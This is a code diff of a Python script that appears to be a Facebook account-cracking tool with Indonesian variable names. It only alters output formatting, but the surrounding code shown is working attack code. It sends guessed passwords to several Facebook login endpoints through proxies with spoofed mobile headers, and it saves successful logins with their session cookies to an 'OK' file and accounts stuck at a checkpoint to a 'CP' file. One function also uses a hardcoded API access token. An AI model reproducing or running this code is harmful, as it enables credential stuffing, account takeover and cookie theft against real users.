@@ -972,7 +972,7 @@ def mobile(uiz,pwr):
 			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r %s*--> %s|%s • %s "%(K,uiz,pw,tahun(uiz)))
+				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
 				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 				cp+=1
 				break
@@ -980,7 +980,7 @@ def mobile(uiz,pwr):
 				if "no" in tampilkan_apk:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
+					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
@@ -988,7 +988,7 @@ def mobile(uiz,pwr):
 				elif "ya" in tampilkan_apk:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
+					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
 					cek_apk(ses,kuki)
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
@@ -1063,7 +1063,7 @@ def mobile_v2(uiz,pwr):
 				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 			po = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=data, headers=headers2, cookies={"cookie": kuko}, proxies=proxs, allow_redirects=False)
 			if "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r %s*--> %s|%s • %s "%(K,uiz,pw,tahun(uiz)))
+				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
 				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 				cp+=1
 				break
@@ -1071,7 +1071,7 @@ def mobile_v2(uiz,pwr):
 				if "no" in tampilkan_apk:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
+					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
@@ -1079,7 +1079,7 @@ def mobile_v2(uiz,pwr):
 				elif "ya" in tampilkan_apk:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
+					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
 					cek_apk(ses,kuki)
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
@@ -1114,7 +1114,7 @@ def mbasic(uiz,pwr):
 			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r %s*--> %s|%s • %s "%(K,uiz,pw,tahun(uiz)))
+				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
 				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 				cp+=1
 				break
@@ -1122,7 +1122,7 @@ def mbasic(uiz,pwr):
 				if "no" in tampilkan_apk:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
+					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
@@ -1130,7 +1130,7 @@ def mbasic(uiz,pwr):
 				elif "ya" in tampilkan_apk:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
+					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
 					cek_apk(ses,kuki)
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
@@ -1164,7 +1164,7 @@ def free(uiz,pwr):
 			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Ffree.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r %s*--> %s|%s • %s "%(K,uiz,pw,tahun(uiz)))
+				print("\r %s*--> %s|%s %s• %s "%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
 				open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
 				cp+=1
 				break
@@ -1172,7 +1172,7 @@ def free(uiz,pwr):
 				if "no" in tampilkan_apk:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
+					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
 					ok+=1
@@ -1180,7 +1180,7 @@ def free(uiz,pwr):
 				elif "ya" in tampilkan_apk:
 					coki=po.cookies.get_dict()
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
+					print("\r %s*--> %s|%s %s• %s "%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
 					print("\r %s*--> %s "%(H,kuki))
 					cek_apk(ses,kuki)
 					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
@@ -1208,12 +1208,12 @@ def api(uiz,pwr):
 		headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua, "content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
 		response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uiz)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers,proxies=proxs) 
 		if "session_key" in response.text and "EAAG" in response.text:
-			print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
+			print("\r %s*--> %s|%s %s• %s"%(H,uiz,pw,warna_warni_biasa,tahun(uiz)))
 			open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+'\n')
 			ok+=1
 			break
 		elif "www.facebook.com" in response.json()["error_msg"]:
-			print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
+			print("\r %s*--> %s|%s %s• %s"%(K,uiz,pw,warna_warni_biasa,tahun(uiz)))
 			open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
 			cp+=1
 			break
